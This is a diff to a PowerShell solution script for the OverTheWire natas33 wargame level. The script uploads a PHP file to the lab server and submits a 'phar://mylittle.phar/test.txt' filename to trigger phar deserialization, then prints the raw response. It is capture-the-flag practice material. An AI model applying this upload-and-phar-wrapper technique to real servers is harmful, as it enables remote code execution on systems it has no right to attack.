@@ -1,6 +1,6 @@
 using namespace Microsoft.PowerShell.Utility
 
-$server = "natas33.natas.labs.overthewire.org/"
+$server = "natas33.natas.labs.overthewire.org"
 #$server = "localhost:8000"
 $url = "http://$server"
 
@@ -30,12 +30,12 @@ $response = Invoke-WebRequest -Headers $headers -URI $url -Method Post -Form $fo
 
 $filename = "upload1.php"
 $formFields = @{
-    uploadedfile = Get-Item -Path 'upload.php'
+    uploadedfile = Get-Item -Path 'upload1.php'
     filename = $filename
 }
 
 $response = Invoke-WebRequest -Headers $headers -URI $url -Method Post -Form $formFields -WebSession $sessVar
-#The update has been uploaded to: /natas33/upload/mylittleindex.php
+#The update has been uploaded to: /natas33/upload/upload1.php
 
 
 $filename = "phar://mylittle.phar/test.txt"
@@ -58,9 +58,10 @@ $response = Invoke-WebRequest -Headers $headers -URI $url -WebSession $sessVar
 $msg = $response
 #>
 
-$msg = $msg.Replace("<br>", "`n");
-write-host `n$msg`n
 
+$msg = $msg.Replace("<br>", "`n");
+#write-host `n$msg`n
+write-host `n($response.RawContent)`n
 <#
 Goal: 
 
